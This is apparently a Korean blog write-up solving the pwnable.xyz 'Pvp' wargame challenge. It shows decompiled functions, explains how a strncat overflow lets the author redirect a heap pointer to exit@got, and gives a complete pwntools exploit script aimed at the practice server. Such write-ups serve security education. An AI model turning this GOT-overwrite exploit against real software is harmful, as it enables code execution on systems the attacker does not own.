---
title: "[pwnable.xyz]Pvp"
date: 2020-2-6
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

srand(time(0))의 랜덤 값만큼 x에 계속 붙여 쓸 수 있다.

```c
unsigned __int64 short_append()
{
  int v0; // ST0C_4
  char s; // [rsp+10h] [rbp-30h]
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v0 = rand() % 32;
  printf("Give me %d chars: ", v0);
  memset(&s, 0, 32uLL);
  read(0, &s, v0);
  strncat(x, &s, v0);
  return __readfsqword(0x28u) ^ v3;
}
```

dest에 원하는 길이만큼 x로 덮을 수 있다.

```c
int save_it()
{
  size_t v0; // rax
  int result; // eax
  size_t n; // [rsp+Ch] [rbp-4h]

  if ( !dest )
  {
    v0 = strlen(x);
    dest = malloc(v0);
  }
  printf("How many bytes is your message? ");
  LODWORD(n) = read_int32();
  if ( n <= 1024 )
    result = strncpy(dest, x, n);
  else
    result = puts("Invalid");
  return result;
}
```

랜덤 길이만큼 x에서 strncat할 수 있고 1024이하 원하는 길이만큼 dest로 strncpy할 수 있다. 

한번도 호출안된 함수의 got를 dest에 덮고 got를 win으로 덮어주면 된다. win을 먼저 3바이트 써놓고 strncat으로 dest를 exit@got로 덮고 save_it으로 3바이트를 덮고 handler실행되기 전까지 기다리면 된다.

> exploit.py

```python
from pwn import *
from ctypes import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30022)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

x = 0x00000000006022A0 # 1024
dest = 0x00000000006026A0 # 8
message = 0x00000000006026A8
count = 0

def quit():
	sa('>','0')

def short_append():
	global count
	sa('>','1')
	byte = int(p.recvuntil('chars').split(' ')[3])
	if byte == 0:
		pass
	else:
		count += byte
		sa(':','A'*byte)

def long_append():
	global count
	sa('>','2')
	byte = int(p.recvuntil('chars').split(' ')[3])
	if byte == 0:
		pass
	else:
		count += byte
		sa(':','A'*byte)

def print_it():
	sa('>','3')

def save_it1():
	sa('>','4')

def save_it2(byte):
	sa('>','4')
	sa('?',str(byte))

sa('>','2')
byte = int(p.recvuntil('chars').split(' ')[3])
count += byte
sa(':','\x2d\x0b\x40' + 'A'*(byte-3))
log.info('count = {}'.format(count))

while True:
	if count < 1000:
		short_append()
	else:
		break
	log.info('count : {}'.format(count))

while True:
	sa('>','1')
	byte = int(p.recvuntil('chars').split(' ')[3])
	log.info('byte : {}'.format(byte))
	if byte == 0:
		pass
	else:
		if count == 1024:
			sa(':','\xa0\x20\x60')
			break
		else:
			sa(':','A')
			count += 1

save_it2(3)
log.info('Sleep 1 min -> exit')
p.interactive()
```